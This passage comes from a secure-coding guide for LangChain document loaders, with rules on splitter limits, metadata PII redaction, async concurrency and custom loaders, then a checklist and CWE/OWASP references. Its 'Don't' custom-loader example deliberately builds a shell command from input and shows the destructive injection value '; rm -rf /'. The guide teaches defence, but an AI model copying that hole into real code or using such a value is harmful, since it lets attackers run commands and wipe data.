    return splitter.split_text(text)

# Attacker passes: chunk_size=1, overlap=0 -> millions of chunks
```

**Why**: Text splitters with user-controlled parameters can cause resource exhaustion. Small chunk sizes create excessive chunks consuming memory. Invalid overlap configurations can cause infinite loops or memory issues.

**Refs**: CWE-400 (Resource Exhaustion), CWE-770 (Allocation Without Limits)

---

## Rule: Metadata Extraction Security

**Level**: `warning`

**When**: Processing document metadata from loaders before storage

**Do**:
```python
from typing import Any, Optional
import re
import html
from dataclasses import dataclass

@dataclass
class MetadataConfig:
    """Configuration for metadata security."""
    allowed_fields: tuple = (
        "source", "title", "author", "page", "chunk_index",
        "file_type", "creation_date", "modification_date",
    )
    max_field_length: int = 1000
    pii_patterns: tuple = (
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
        r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',  # Phone
        r'\b\d{3}[-]?\d{2}[-]?\d{4}\b',  # SSN
    )

class SecureMetadataProcessor:
    """Secure metadata processing for LangChain documents."""

    def __init__(self, config: Optional[MetadataConfig] = None):
        self.config = config or MetadataConfig()

    def sanitize_metadata(self, metadata: dict[str, Any]) -> dict[str, Any]:
        """Sanitize metadata from LangChain documents."""
        sanitized = {}

        for key, value in metadata.items():
            normalized_key = key.lower().replace(" ", "_").replace("-", "_")

            if normalized_key not in self.config.allowed_fields:
                continue

            sanitized_value = self._sanitize_value(value)
            sanitized[normalized_key] = sanitized_value

        return sanitized

    def _sanitize_value(self, value: Any) -> Any:
        """Sanitize individual metadata value."""
        if value is None:
            return None

        if isinstance(value, (int, float, bool)):
            return value

        str_value = str(value)

        if len(str_value) > self.config.max_field_length:
            str_value = str_value[:self.config.max_field_length] + "..."

        str_value = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', str_value)
        str_value = html.escape(str_value)

        for pattern in self.config.pii_patterns:
            str_value = re.sub(pattern, '[REDACTED]', str_value)

        return str_value.strip()

    def process_documents(self, documents: list) -> list:
        """Process list of LangChain documents with metadata sanitization."""
        processed = []

        for doc in documents:
            doc.metadata = self.sanitize_metadata(doc.metadata)
            processed.append(doc)

        return processed


# Usage
processor = SecureMetadataProcessor()
docs = loader.load()
secure_docs = processor.process_documents(docs)
```

**Don't**:
```python
# VULNERABLE: No metadata sanitization
def load_and_store(file_path: str):
    loader = TextLoader(file_path)
    docs = loader.load()

    # Metadata may contain:
    # - Full file paths with usernames
    # - Author email addresses
    # - System information

    for doc in docs:
        vector_store.add_documents([doc])  # Unsanitized metadata stored
```

**Why**: Document metadata often contains sensitive information like email addresses, file paths revealing usernames, or system details. Metadata is often exposed in search results and UIs. Field allowlisting and PII redaction prevent data leakage.

**Refs**: CWE-200 (Information Exposure), CWE-359 (Privacy Violation), GDPR Article 5

---

## Rule: Async Loader Security

**Level**: `warning`

**When**: Using `AsyncChromiumLoader`, `AsyncHtmlLoader`, or any async loader

**Do**:
```python
from langchain_community.document_loaders import AsyncHtmlLoader
import asyncio
from typing import Optional

class SecureAsyncLoader:
    """Secure wrapper for LangChain async loaders with concurrency control."""

    def __init__(
        self,
        max_concurrency: int = 5,
        timeout: int = 30,
        max_urls: int = 100,
        rate_limit: float = 1.0,  # seconds between requests
    ):
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.max_urls = max_urls
        self.rate_limit = rate_limit
        self._semaphore = asyncio.Semaphore(max_concurrency)

    async def load_urls(self, urls: list[str]) -> list:
        """Load URLs with concurrency and timeout controls."""

        if len(urls) > self.max_urls:
            raise ValueError(f"Too many URLs ({len(urls)}), limit is {self.max_urls}")

        loader = AsyncHtmlLoader(
            urls,
            timeout=self.timeout,
            requests_per_second=1 / self.rate_limit,
        )

        try:
            documents = await asyncio.wait_for(
                loader.aload(),
                timeout=self.timeout * len(urls) / self.max_concurrency + 60
            )
        except asyncio.TimeoutError:
            raise TimeoutError(
                f"Async loading timed out after {self.timeout}s per URL"
            )

        return documents

    async def load_with_semaphore(self, url: str) -> Optional[object]:
        """Load single URL with semaphore control."""
        async with self._semaphore:
            loader = AsyncHtmlLoader([url], timeout=self.timeout)
            try:
                docs = await asyncio.wait_for(
                    loader.aload(),
                    timeout=self.timeout
                )
                await asyncio.sleep(self.rate_limit)
                return docs[0] if docs else None
            except asyncio.TimeoutError:
                return None

    def load_sync(self, urls: list[str]) -> list:
        """Synchronous wrapper for async loading."""
        return asyncio.run(self.load_urls(urls))


# Usage
async def main():
    loader = SecureAsyncLoader(
        max_concurrency=5,
        timeout=30,
        max_urls=50,
    )
    docs = await loader.load_urls(validated_urls)
    return docs

docs = asyncio.run(main())
```

**Don't**:
```python
from langchain_community.document_loaders import AsyncHtmlLoader

# VULNERABLE: No concurrency limits
async def load_urls_unsafe(urls: list[str]):
    loader = AsyncHtmlLoader(urls)  # All URLs fetched concurrently, no limits
    return await loader.aload()

# Attacker passes 1000 URLs -> system resource exhaustion
```

**Why**: Async loaders without concurrency limits can exhaust system resources (file descriptors, memory) or overwhelm target servers. Missing timeouts can cause operations to hang indefinitely. Semaphores and rate limiting ensure controlled resource usage.

**Refs**: CWE-400 (Resource Exhaustion), CWE-770 (Allocation Without Limits), CWE-834 (Excessive Iteration)

---

## Rule: Custom Loader Security

**Level**: `strict`

**When**: Creating custom LangChain document loaders by extending `BaseLoader`

**Do**:
```python
from langchain_core.document_loaders import BaseLoader
from langchain_core.documents import Document
from typing import Iterator, Optional, Any
import logging
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class CustomLoaderConfig:
    """Configuration for custom loader security."""
    max_documents: int = 1000
    max_content_size: int = 10 * 1024 * 1024  # 10MB per document
    timeout: int = 60
    allowed_sources: tuple = ()

class SecureCustomLoader(BaseLoader):
    """Template for secure custom LangChain loader implementation."""

    def __init__(
        self,
        source: str,
        config: Optional[CustomLoaderConfig] = None,
        **kwargs: Any,
    ):
        self.config = config or CustomLoaderConfig()
        self.source = self._validate_source(source)
        self.kwargs = self._validate_kwargs(kwargs)

    def _validate_source(self, source: str) -> str:
        """Validate data source."""
        if not source:
            raise ValueError("Source cannot be empty")

        if self.config.allowed_sources:
            if source not in self.config.allowed_sources:
                raise ValueError(f"Source not in allowlist: {source}")

        return source

    def _validate_kwargs(self, kwargs: dict) -> dict:
        """Validate and sanitize additional arguments."""
        validated = {}

        for key, value in kwargs.items():
            if not isinstance(key, str):
                raise ValueError(f"Invalid kwarg key type: {type(key)}")

            if not key.isalnum() and "_" not in key:
                raise ValueError(f"Invalid kwarg key: {key}")

            validated[key] = value

        return validated

    def lazy_load(self) -> Iterator[Document]:
        """Lazily load documents with security controls."""
        document_count = 0

        try:
            for item in self._fetch_items():
                if document_count >= self.config.max_documents:
                    logger.warning(
                        f"Document limit reached ({self.config.max_documents})"
                    )
                    break

                doc = self._process_item(item)

                if doc:
                    document_count += 1
                    yield doc

        except Exception as e:
            logger.error(f"Error in custom loader: {type(e).__name__}")
            raise RuntimeError("Document loading failed") from e

    def _fetch_items(self) -> Iterator[Any]:
        """Fetch raw items from source. Override in subclass."""
        raise NotImplementedError("Subclass must implement _fetch_items")

    def _process_item(self, item: Any) -> Optional[Document]:
        """Process raw item into Document with validation."""
        try:
            content = self._extract_content(item)

            if len(content) > self.config.max_content_size:
                logger.warning(f"Content exceeds size limit, truncating")
                content = content[:self.config.max_content_size]

            metadata = self._extract_metadata(item)
            sanitized_metadata = self._sanitize_metadata(metadata)

            return Document(
                page_content=content,
                metadata=sanitized_metadata,
            )

        except Exception as e:
            logger.warning(f"Failed to process item: {type(e).__name__}")
            return None

    def _extract_content(self, item: Any) -> str:
        """Extract text content from item. Override in subclass."""
        raise NotImplementedError("Subclass must implement _extract_content")

    def _extract_metadata(self, item: Any) -> dict:
        """Extract metadata from item. Override in subclass."""
        return {"source": self.source}

    def _sanitize_metadata(self, metadata: dict) -> dict:
        """Sanitize metadata for security."""
        sanitized = {}

        for key, value in metadata.items():
            if value is None:
                continue

            safe_key = str(key).lower().replace(" ", "_")[:50]

            if isinstance(value, str):
                safe_value = value[:1000]
            else:
                safe_value = value

            sanitized[safe_key] = safe_value

        return sanitized
```

**Don't**:
```python
from langchain_core.document_loaders import BaseLoader

# VULNERABLE: Insecure custom loader
class UnsafeLoader(BaseLoader):
    def __init__(self, source, **kwargs):
        self.source = source  # No validation
        self.kwargs = kwargs  # Unvalidated kwargs

    def lazy_load(self):
        import subprocess

        # Command injection vulnerability!
        result = subprocess.run(
            f"cat {self.source}",  # User input in shell command
            shell=True,
            capture_output=True
        )

        yield Document(
            page_content=result.stdout.decode(),
            metadata=self.kwargs  # Unsanitized metadata
        )

# Attacker passes: source = "; rm -rf /"
```

**Why**: Custom loaders without input validation enable injection attacks. Missing error handling exposes sensitive information. Unsanitized metadata propagates through the entire RAG pipeline. Proper validation at the loader level prevents vulnerabilities from entering the system.

**Refs**: CWE-78 (OS Command Injection), CWE-20 (Input Validation), CWE-209 (Error Information Exposure)

---

## Implementation Checklist

### Web Loaders
- [ ] URL allowlist configured
- [ ] SSRF protection (private IP blocking)
- [ ] Timeout limits set
- [ ] Content size limits enforced
- [ ] SSL verification enabled

### File Loaders
- [ ] Base directory confinement
- [ ] Path traversal prevention
- [ ] MIME type validation
- [ ] File size limits
- [ ] Extension allowlisting

### Database Loaders
- [ ] Parameterized queries only
- [ ] Table/column allowlisting
- [ ] Credentials from environment
- [ ] Row limits enforced
- [ ] Query timeout configured

### Git Loaders
- [ ] SSH key or env-var PAT (no token in URL)
- [ ] Repository URL allowlist
- [ ] Credential URL pattern rejected

### S3/Cloud Storage Loaders
- [ ] Bucket allowlist enforced
- [ ] IAM least-privilege (no wildcard bucket ARN)
- [ ] Credentials via instance role, not hardcoded
- [ ] Regional endpoint enforced

### UnstructuredFileLoader / Parser
- [ ] Parser library versions pinned
- [ ] Parsing isolated in subprocess or container
- [ ] File size and extension pre-checked
- [ ] Parser stderr not forwarded to client

### JSONLoader
- [ ] jq_schema from static allowlist only
- [ ] User input never interpolated into jq expression

### CSVLoader
- [ ] Formula-prefix cells sanitized before export to spreadsheets
- [ ] Leading `'` prepended to cells starting with `=`, `+`, `-`, `@`

### API Loaders
- [ ] API keys from secure storage
- [ ] Rate limiting implemented
- [ ] Response validation
- [ ] Retry logic with backoff
- [ ] Timeout handling

### Text Splitters
- [ ] Chunk size limits
- [ ] Overlap validation
- [ ] Maximum chunks enforced
- [ ] Input size limits
- [ ] Memory monitoring

### Metadata Processing
- [ ] Field allowlisting
- [ ] PII detection/redaction
- [ ] Value sanitization
- [ ] Length limits
- [ ] XSS prevention

---

## References

### CWE References
- CWE-20: Improper Input Validation
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-78: OS Command Injection
- CWE-89: SQL Injection
- CWE-119: Buffer Errors
- CWE-200: Exposure of Sensitive Information
- CWE-209: Information Exposure Through an Error Message
- CWE-284: Improper Access Control
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-359: Privacy Violation
- CWE-400: Uncontrolled Resource Consumption
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-441: Unintended Proxy or Intermediary
- CWE-770: Allocation of Resources Without Limits or Throttling
- CWE-798: Use of Hard-coded Credentials
- CWE-834: Excessive Iteration
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-1236: Improper Neutralization of Formula Elements in a CSV File
- CWE-1357: Reliance on Insufficiently Trustworthy Component

### OWASP References
- OWASP A01:2025 — Broken Access Control
- OWASP A02:2025 — Cryptographic Failures
- OWASP A03:2025 — Injection
- OWASP A05:2025 — Security Misconfiguration
- OWASP A06:2025 — Vulnerable and Outdated Components
- OWASP A10:2025 — Server-Side Request Forgery (SSRF)
- LLM01:2025 — Prompt Injection (applies to content loaded from web, API, and git loaders)

### Additional Resources
- LangChain Security Best Practices
- NIST AI RMF — Data Governance
- GDPR Article 5 — Data Minimization

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2024-01 | Initial release with 8 core loader security rules |
| 2.0 | 2026-05-26 | OWASP refs updated to 2025; LLM Top 10 2025 added; GitLoader auth, S3Loader IAM, UnstructuredFileLoader sandbox, JSONLoader jq_schema injection, CSVLoader formula injection rules added; langchain-community 0.3.x imports |
